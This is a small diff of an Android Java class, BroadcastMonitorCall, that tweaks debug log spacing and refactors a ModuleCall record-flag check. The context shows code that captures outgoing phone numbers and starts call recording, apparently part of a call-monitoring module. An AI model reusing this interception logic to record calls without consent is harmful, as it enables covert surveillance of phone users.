@@ -84,8 +84,8 @@ public class BroadcastMonitorCall  {
 			 /****************************************/
 			String extraIntent = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (manageReceive): callState="+callState.intValue());
-				Check.log(TAG + " (manageReceive): intent="+intent);
+				Check.log(TAG + " (manageReceive): callState= "+callState.intValue());
+				Check.log(TAG + " (manageReceive): intent= "+intent);
 			}
 			if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
 				ongoing_number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
@@ -202,7 +202,8 @@ public class BroadcastMonitorCall  {
 							call.setOngoing(true);
 							call.setOffhook();
 							//ListenerCall.self().dispatch(call);
-							if (ModuleCall.self() != null && ModuleCall.self().isRecordFlag()) {
+							ModuleCall mc = ModuleCall.self();
+							if (mc != null && mc.isRecordFlag()) {
 								if (Cfg.DEBUG) {
 									Check.log(TAG + " (manageReceive): starting call"); //$NON-NLS-1$
 								}
